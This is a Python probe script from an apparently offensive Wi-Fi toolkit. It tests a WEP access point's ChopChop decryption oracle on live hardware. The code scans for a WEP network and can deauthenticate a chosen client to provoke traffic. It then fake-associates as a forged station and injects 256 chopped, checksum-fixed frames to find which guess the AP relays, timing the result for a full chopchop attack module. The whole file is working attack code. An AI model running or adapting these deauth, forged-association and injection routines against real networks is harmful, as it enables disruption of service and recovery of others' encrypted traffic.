"""WEP ChopChop ORACLE probe (M6 — hardware ground truth).

The ChopChop crypto is built + offline-verified (wep_crypto.chop_last_byte_and_
fixup); the unknown is the live AP's ORACLE behavior: when we chop a frame's
last byte, guess its plaintext, and fix the ICV, does the AP relay the shortened
frame on the CORRECT guess (and drop wrong ones)? And what does that relay look
like + how long does it take? Can't know offline — so this gets real packets.

What it does (one byte, all 256 guesses):
  1. Discover the card, park on the target channel, find the WEP AP.
  2. Capture a broadcast WEP data frame (the frame to chop).
  3. Fake-auth (associate) so the AP accepts/relays our frames.
  4. For guess 0..255: chop the last cipher byte + fix the ICV for that guess,
     re-header to broadcast-from-us, inject. (No sw_seq — single frames.)
  5. Dump EVERY RX frame timestamped to a .pcap + console log, flagging
     candidate relays: FromDS broadcast WEP data sourced from our STA, ~1 byte
     shorter than the original.
  6. With --key, decrypt the original to find the TRUE last byte, and confirm
     exactly that guess elicited a relay — and MEASURE the per-guess latency
     (critical: the daemon does 256 guesses × ~36 bytes, so the timeout matters).

Then we code chopchop.py's oracle to what the box actually does. This probe
TRANSMITS — an explicit, run-it-yourself tool, never passive operation.

Usage (at the dd-wrt box):
    uv run python scripts/wep/chopchop_probe.py --bssid AA:BB:.. --key abcde
    uv run python scripts/wep/chopchop_probe.py --ssid MyWepNet --channel 6 --key abcde
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import struct
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
from wifit3.engine.attacks.wep.wep_crypto import chop_last_byte_and_fixup
from wifit3.wlan.manager import WlanDeviceManager

# ---- console helpers (match the test_hw_* aesthetic) -----------------------


def step(label: str) -> None:
    print(f"\n--- {label} ---")


def ok(msg: str) -> None:
    print(f"[PASS] {msg}")


def info(msg: str) -> None:
    print(f"  {msg}")


def fail(msg: str) -> None:
    print(f"[FAIL] {msg}")
    sys.exit(1)


def _mac(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


# ---- self-contained pcap writer (per-frame timestamps) ---------------------

_LINKTYPE_IEEE802_11 = 105


def write_pcap(path: Path, frames: list) -> int:
    """frames: list of (ts_float, raw_bytes). Standard libpcap, linktype 105."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535,
                            _LINKTYPE_IEEE802_11))
        for ts, frame in frames:
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
            f.write(frame)
    return len(frames)


# ---- 802.11 / RC4 helpers --------------------------------------------------


def _hdr_len(fc0: int, fc1: int) -> int:
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):   # ToDS+FromDS → 4-address (WDS)
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:      # QoS data subtype
        n += 2
    if fc1 & 0x80:                      # HT Control (Order bit)
        n += 4
    return n


def _rc4(key: bytes, n: int) -> bytes:
    """First n bytes of RC4 keystream (inlined; a clean decrypt is self-
    validating, keeps the probe dependency-light)."""
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(n)
    i = j = 0
    for k in range(n):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[k] = s[(s[i] + s[j]) & 0xFF]
    return bytes(out)


def _describe(frame: bytes) -> str:
    if len(frame) < 10:
        return f"len={len(frame)} (runt)"
    fc0, fc1 = frame[0], frame[1]
    kind = {0: "mgmt", 1: "ctrl", 2: "data", 3: "ext"}[(fc0 >> 2) & 0x03]
    flags = ",".join(
        f for f, bit in (("ToDS", 0x01), ("FromDS", 0x02), ("Prot", 0x40))
        if fc1 & bit
    ) or "-"
    a1 = _mac(frame[4:10])
    a3 = _mac(frame[16:22]) if len(frame) >= 22 else "?"
    iv = ""
    if ((fc0 >> 2) & 0x03) == 2 and (fc1 & 0x40):
        body = frame[_hdr_len(fc0, fc1):]
        if len(body) >= 3:
            iv = f" iv={body[:3].hex()}"
    return f"{kind} [{flags}] len={len(frame)} a1={a1} a3={a3}{iv}"


# ---- the probe -------------------------------------------------------------


class ChopProbe:
    """RX sink: capture everything; flag candidate relays of OUR chopped frame —
    FromDS + Protected data, broadcast DA, Addr3(SA)==our STA, ~orig-1 long."""

    def __init__(self, source_mac: bytes, orig_len: int):
        self.source_mac = source_mac
        self.orig_len = orig_len
        self.captured: list = []           # (ts, frame)
        self.relays: list = []             # (ts, frame)

    def rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        self.captured.append((ts, bytes(frame)))
        if len(frame) < 24:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2 or not (fc1 & 0x40):     # data + Protected
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):                 # FromDS, not ToDS
            return
        if frame[4:10] != b"\xff" * 6:                       # DA broadcast
            return
        if frame[16:22] != self.source_mac:                  # SA == our STA
            return
        self.relays.append((ts, bytes(frame)))


async def discover_iface(debug: bool):
    mgr = WlanDeviceManager()
    ifaces = await mgr.refresh()
    if not ifaces:
        fail("No supported wifit3 card found (Zadig→WinUSB on Windows).")
    iface = ifaces[0]
    info(f"Using {iface.name}: {iface.description}")
    if not await iface.connect(progress_cb=lambda p, m: None):
        fail("Driver connect() failed — replug and retry.")
    return mgr, iface


async def find_ap(iface, channel, bssid, ssid, scan_s):
    step(f"Park on channel {channel}, find the WEP AP")
    if not await iface.set_channel(channel):
        fail(f"set_channel({channel}) failed.")
    deadline = time.time() + scan_s
    target = None
    while time.time() < deadline and not target:
        for ap in iface.get_access_points():
            if bssid and ap.bssid.lower() != bssid.lower():
                continue
            if ssid and (ap.ssid or "") != ssid:
                continue
            if (ap.encryption or "").upper() == "WEP" or bssid:
                target = ap
                break
        if not target:
            await asyncio.sleep(0.5)
    if not target:
        fail(f"No matching WEP AP in {scan_s:.0f}s on ch {channel}.")
    info(f"Target: {target.bssid}  ssid={target.ssid!r}  enc={target.encryption}")
    return target


async def capture_chop_target(iface, bssid, wait_s, provoke):
    step("Capture a broadcast WEP data frame to chop")
    if provoke:
        info(f"Provoking: deauthing {provoke} to stir up traffic.")
        await iface.deauth(bssid, provoke, burst_count=8)
    deadline = time.time() + wait_s
    while time.time() < deadline:
        cands = iface.wep_store.arp_candidates(bssid)
        if cands:
            frame = cands[-1]
            ok(f"Got a {len(frame)}-byte broadcast WEP frame to chop.")
            return frame
        await asyncio.sleep(0.5)
    fail(f"No broadcast WEP frame in {wait_s:.0f}s "
         f"({iface.wep_store.arp_seen_count(bssid)} seen). Generate LAN "
         "traffic (ping gateway) or use --provoke <client_mac>.")


def build_chopped_frame(iv, keyid_byte, cipher, guess, bssid_b, src_mac):
    """Re-header a chopped+ICV-fixed body to a broadcast frame from our STA."""
    chopped = chop_last_byte_and_fixup(cipher, guess)
    body = iv + bytes([keyid_byte]) + chopped
    hdr = (b"\x08\x41" + b"\x00\x00"        # Data, ToDS=1, Protected=1
           + bssid_b + src_mac + b"\xff" * 6 + b"\x00\x00")
    return hdr + body


async def main_async(args) -> int:
    mgr, iface = await discover_iface(args.debug)
    try:
        target = await find_ap(iface, args.channel, args.bssid, args.ssid,
                               args.scan_secs)
        captured = await capture_chop_target(
            iface, target.bssid, args.arp_wait_secs, args.provoke
        )
        h = _hdr_len(captured[0], captured[1])
        iv, keyid_byte, cipher = captured[h:h + 3], captured[h + 3], captured[h + 4:]
        if len(cipher) < 5:
            fail(f"captured cipher too short ({len(cipher)}B) to chop.")
        info(f"Chop target: IV={iv.hex()} keyid={keyid_byte:#04x} "
             f"cipher={len(cipher)}B")

        # True last plaintext byte (of plaintext++ICV) — the only guess that
        # should elicit a relay. Known via the WEP key (gold-standard verify).
        true_last = None
        if args.key is not None:
            ks = _rc4(iv + args.key, len(cipher))
            plain = bytes(c ^ k for c, k in zip(cipher, ks))
            true_last = plain[-1]
            info(f"WEP key {args.key!r} → true last byte = {true_last:#04x} "
                 f"(decrypted {len(plain)}B incl. ICV)")

        step("Fake-auth (associate as a forged STA)")
        fake_auth = WepFakeAuth(iface, target, log_callback=lambda m: info(m))
        fake_auth.start()
        deadline = time.time() + args.assoc_wait_secs
        while time.time() < deadline and fake_auth.state != "associated":
            await asyncio.sleep(0.2)
        if fake_auth.state != "associated":
            fake_auth.stop()
            fail(f"Could not associate (state={fake_auth.state}).")
        ok(f"Associated as {_mac(fake_auth.source_mac)}")

        probe = ChopProbe(fake_auth.source_mac, len(captured))
        iface.register_rx_callback(probe.rx_cb)
        bssid_b = _str_to_mac(target.bssid)

        step(f"Sweep all 256 guesses for the last byte ({args.gap*1000:.0f}ms "
             "apart), dumping ALL RX")
        send_ts = {}
        try:
            for guess in range(256):
                frame = build_chopped_frame(
                    iv, keyid_byte, cipher, guess, bssid_b, fake_auth.source_mac
                )
                await iface.send_raw(frame, use_no_ack=True)
                send_ts[guess] = time.time()
                await asyncio.sleep(args.gap)
            info(f"Sent 256 guesses; listening {args.listen_secs:.0f}s more for "
                 "late relays…")
            await asyncio.sleep(args.listen_secs)
        finally:
            iface.unregister_rx_callback(probe.rx_cb)
            fake_auth.stop()

        # ---- report --------------------------------------------------------
        step("Results")
        out = Path(args.out)
        info(f"Captured {write_pcap(out, probe.captured)} frames → {out}")
        if not probe.relays:
            info("NO candidate relay (FromDS broadcast WEP data sourced from "
                 "our STA) seen. Datapoint, not necessarily failure: the AP may "
                 "not relay chopped frames, the single send may have been lost "
                 "(try lower --gap / a 2nd pass), or it relays differently than "
                 "the SA=us/FromDS/broadcast hypothesis. Inspect the .pcap.")
            return 0
        ok(f"{len(probe.relays)} candidate relay(s) — the ORACLE FIRES:")
        for ts, fr in probe.relays[:8]:
            print(f"    {_describe(fr)}  (orig was {len(captured)}B)")
        # Crypto guarantees only the true-last-byte guess yields a valid ICV, so
        # any relay must be that guess. With the key we confirm + time it.
        if true_last is not None:
            n = len(probe.relays)
            t_sent = send_ts.get(true_last)
            t_relay = probe.relays[0][0]
            latency = (t_relay - t_sent) if t_sent else None
            print()
            if n == 1:
                ok(f"Exactly 1 relay — matches the unique valid guess "
                   f"{true_last:#04x}.")
            else:
                info(f"{n} relays (expected 1 — extras may be the AP "
                     "re-relaying, or noise; check the .pcap).")
            if latency is not None:
                ok(f"Per-guess relay latency ≈ {latency*1000:.0f} ms "
                   "(→ chopchop.py's per-guess oracle timeout).")
            print("\n  => ChopChop oracle CONFIRMED: chop+fixup on the correct "
                  "guess makes the AP relay the shortened frame. Code "
                  "chopchop.py to: SA=us + FromDS + broadcast + len≈orig-1, "
                  "with the measured timeout.")
        else:
            info("(pass --key <ascii> to confirm the relay is the true-byte "
                 "guess + measure per-guess latency.)")
        return 0
    finally:
        step("Release device")
        await mgr.close_all()
        info("Closed.")


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--bssid", help="target AP BSSID (preferred selector)")
    p.add_argument("--ssid", help="target AP SSID (if BSSID unknown)")
    p.add_argument("--channel", type=int, default=6, help="target channel")
    p.add_argument("--key", type=lambda s: s.encode(), help="WEP key as ASCII "
                   "(your test box's key) to verify + time the relay")
    p.add_argument("--key-hex", type=bytes.fromhex, dest="key",
                   help="WEP key as hex instead of --key")
    p.add_argument("--provoke", help="deauth this client MAC to stir traffic")
    p.add_argument("--scan-secs", type=float, default=8.0)
    p.add_argument("--arp-wait-secs", type=float, default=30.0)
    p.add_argument("--assoc-wait-secs", type=float, default=8.0)
    p.add_argument("--gap", type=float, default=0.04, help="seconds between guesses")
    p.add_argument("--listen-secs", type=float, default=3.0,
                   help="extra RX listen after the sweep")
    p.add_argument("--out", default="wifit3-wep-chop.pcap", help="pcap output")
    p.add_argument("--debug", action="store_true", help="verbose USB/driver logging")
    args = p.parse_args()

    if not args.bssid and not args.ssid:
        p.error("give --bssid (preferred) or --ssid to pick the target")

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    try:
        return asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[interrupted]")
        return 1


if __name__ == "__main__":
    sys.exit(main())
